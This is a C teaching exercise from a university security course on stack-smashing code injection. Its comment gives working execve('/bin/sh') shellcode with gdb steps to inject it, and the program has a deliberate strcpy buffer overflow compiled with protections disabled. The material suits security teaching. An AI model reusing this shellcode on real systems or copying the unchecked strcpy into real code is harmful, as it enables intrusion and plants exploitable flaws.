/*
 * Code Injection 
 * (c) Elias Athanasopoulos,  eliasathan@cs.ucy.ac.cy
 *
 * Compile the attached C program.
 * $ gcc -Wall -ggdb -no-pie -fno-pic -z execstack -m32 stack-smash2.c -o stack-smash2
 *
 * Compile the shellcode:
 * .section .data
 * .section .text
 * .globl _start
 *  
 * _start:
 * 	xor    	%eax,%eax
 * 	push   	%eax		# push \0
 * 	push   	$0x68732f2f	# //sh
 * 	push   	$0x6e69622f	# /bin
 * 	mov    	%esp,%ebx
 * 	xor	%ecx,%ecx
 * 	xor 	%edx,%edx
 * 	mov    	$0xb,%al
 * 	int    	$0x80
 * 
 * $ as --32 shellcode.s -o shellcode.o
 *
 * Inspect the shellcode:
 * 
 * $ objdump -d ./shellcode.o
 *
 * Disassembly of section .text:
 * 
 * 00000000 <_start>:
 *    0:	31 c0                	xor    %eax,%eax
 *    2:	50                   	push   %eax
 *    3:	68 2f 2f 73 68       	push   $0x68732f2f
 *    8:	68 2f 62 69 6e       	push   $0x6e69622f
 *    d:	89 e3                	mov    %esp,%ebx
 *    f:	31 c9                	xor    %ecx,%ecx
 *   11:	31 d2                	xor    %edx,%edx
 *   13:	b0 0b                	mov    $0xb,%al
 *   15:	cd 80                	int    $0x80
 * 
 * The shellcode is: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
 *
 * Repeat the steps in stack-smash0.c using this program (do not forget the -z
 * execstack option), the shellcode and gdb in order to spawn a shell in the
 * vulnerable program.
 *
 * Example stack snapshot (return address is noted with '*'):
 * 
 * (gdb) r `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAA"`
 * Starting program: /home/elathan/ucy/epl326/8/stack-smash `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAA"`
 * 
 * Breakpoint 1, 0x080484e7 in authenticate_root ()
 * (gdb) x/32x $ebp-32
 * 0xffffd288:	0xf7e0de18	0x6850c031	0x68732f2f	0x69622f68
 * 0xffffd298:	0x31e3896e	0xb0d231c9	0x4180cd0b	0x00414141
 * 0xffffd2a8:	0xffffd2c8	0x08048565* 0xffffd51e	0xffffd374
 * 0xffffd2b8:	0xffffd380	0x080485c1	0xf7fb53dc	0xffffd2e0
 * 0xffffd2c8:	0x00000000	0xf7e19276	0x00000002	0xf7fb5000
 * 0xffffd2d8:	0x00000000	0xf7e19276	0x00000002	0xffffd374
 * 0xffffd2e8:	0xffffd380	0x00000000	0x00000000	0x00000000
 * 0xffffd2f8:	0xf7fb5000	0xf7ffdc04	0xf7ffd000	0x00000000
 *  
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int password_valid = 0;

void authenticate_root(char *passwd) {
	unsigned long marker = 0xdeadbeef;
	char password[16];

	strcpy(password, passwd);

	fprintf(stderr, "%p\n", &marker);
	fprintf(stderr, "Validating password: %s\n", password);

	if (!strcmp(password, "e5ce4db216329f4f")) 
		password_valid = marker;

}

int main(int argc, char *argv[]) {

	authenticate_root(argv[1]);

	if (password_valid != 0) {
		printf("Welcome administrator.\n");
	} else {
		printf("Access denied.\n");
	}

	return 1;
}
